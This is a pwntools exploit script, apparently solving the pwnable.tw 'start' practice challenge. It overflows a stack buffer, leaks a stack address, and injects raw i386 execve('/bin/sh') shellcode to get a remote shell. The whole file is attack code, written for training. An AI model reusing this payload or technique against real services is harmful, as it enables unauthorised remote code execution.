#!/usr/bin/python3
from pwn import *

context(arch='i386', os='linux')

r = remote('chall.pwnable.tw', 10000)


#payload = b'a' * 0x14
#payload += asm('''
#	mov esp, ecx
#''')

payload = b'a' * 0x14 + p32(0x8048087)

r.sendafter("CTF:", payload)

leak = u32(r.recv(4))
print(hex(leak))


payload = b'a' * 0x14 + p32(leak + 0x14)
payload += b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00'
#payload += asm(shellcraft.sh())

r.send(payload)





r.interactive()





